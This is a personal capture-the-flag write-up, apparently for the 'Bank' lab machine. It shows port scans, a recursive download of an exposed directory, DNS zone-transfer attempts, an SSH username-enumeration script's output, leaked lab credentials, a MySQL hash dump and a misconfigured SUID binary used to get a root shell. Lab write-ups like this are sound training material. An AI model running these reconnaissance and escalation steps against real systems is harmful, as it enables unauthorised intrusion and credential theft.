--------------------------------------------------------------------------------------------------------------------------------

nmap

22/tcp open ssh OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)

| ssh-hostkey:

| 1024 08:ee:d0:30:d5:45:e4:59:db:4d:54:a8:dc:5c:ef:15 (DSA)

| 2048 b8:e0:15:48:2d:0d:f0:f1:73:33:b7:81:64:08:4a:91 (RSA)

| 256 a0:4c:94:d1:7b:6e:a8:fd:07:fe:11:eb:88:d5:16:65 (ECDSA)

|_ 256 2d:79:44:30:c8:bb:5e:8f:07:cf:5b:72:ef:a1:6d:67 (ED25519)

53/tcp open domain ISC BIND 9.9.5-3ubuntu0.14 (Ubuntu Linux)

| dns-nsid:

|_ bind.version: 9.9.5-3ubuntu0.14-Ubuntu

80/tcp open http Apache httpd 2.4.7 ((Ubuntu))

|_http-server-header: Apache/2.4.7 (Ubuntu)

|_http-title: Apache2 Ubuntu Default Page: It works

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

--------------------------------------------------------------------------------------------------------------------------------

80 http

Had to add bank.htb to /etc/hosts

Connecting to site gets you redirected to → [http://bank.htb/login.php](http://bank.htb/login.php)

[http://bank.htb/inc/](http://bank.htb/inc/) -> very interesting , has user.php and ticket.php, first I wanna try dns.

I didn't let my fucking gobuster end scan and i missed a flag so i had to look in the writeup...

Anyway. I found a directory called [http://bank.htb/balance-transfer](http://bank.htb/balance-transfer) that had bunch of files.

To download the files from the directory I used:

#directoryDownload

wget -r -np -nH --cut-dirs=1 -R "index.html*" [http://bank.htb/balance-transfer](http://bank.htb/balance-transfer)

All these files had username/password/etc but all were encrpyted...

All files started with : "++OK ENCRYPT SUCCESS"

grep -L "++OK ENCRYPT SUCCESS" * -L finds everything BUT this in the specific search.

===UserAccount===

Full Name: Christos Christopoulos

Email: chris@bank.htb

Password: !##HTBB4nkP4ssw0rd!##

CreditCards: 5

Transactions: 39

Balance: 8842803 .

===UserAccount===

--------------------------------------------------------------------------------------------------------------------------------

53 DNS

dig afxr bank.htb @10.129.24.30

- ns.bank.htb

dig axfr ns.bank.htb @10.129.24.30

--------------------------------------------------------------------------------------------------------------------------------

SSH version looks old - might be a way in.

22 SSH

[https://github.com/arturo-b-cmu/cve-2016-20012/blob/main/cve-2016-20012-script.py](https://github.com/arturo-b-cmu/cve-2016-20012/blob/main/cve-2016-20012-script.py)

Username: info, Avg Response Time: 30.2701 seconds, Std Dev: 0.0228

Username: admin, Avg Response Time: 30.2548 seconds, Std Dev: 0.0481

Username: 2000, Avg Response Time: 30.1467 seconds, Std Dev: 0.2480

[privEsc](boxes--biziness--privEsc_16.html)

www-data@bank:/var/www/bank/inc

has ticket.php

"root", "!@#S3cur3P4ssw0rd!@#", "htbbank");

mysql> SELECT user,password FROM user;

+------------------+-------------------------------------------+

| user | password |

+------------------+-------------------------------------------+

| root | *9A93638EA994193362EECB26502099FD4C3ECE2C |

| root | *9A93638EA994193362EECB26502099FD4C3ECE2C |

| root | *9A93638EA994193362EECB26502099FD4C3ECE2C |

| root | *9A93638EA994193362EECB26502099FD4C3ECE2C |

| debian-sys-maint | *D57FF5813D1E8C88D62ECA60802F4FE138CD706C |

+------------------+-------------------------------------------+

^^ red herring...

There was a /var/htb/bin/emergency SUID...

Good lesson here, i looked at this but I couldnt find it in gtfo bins.

basically it was a poorly configured SUID that gives instant root shell. from now on remember to just use it once just in case!

Overall good performance here, was lazy on gobuster thats why i had to look at lookup, rest i did by myself.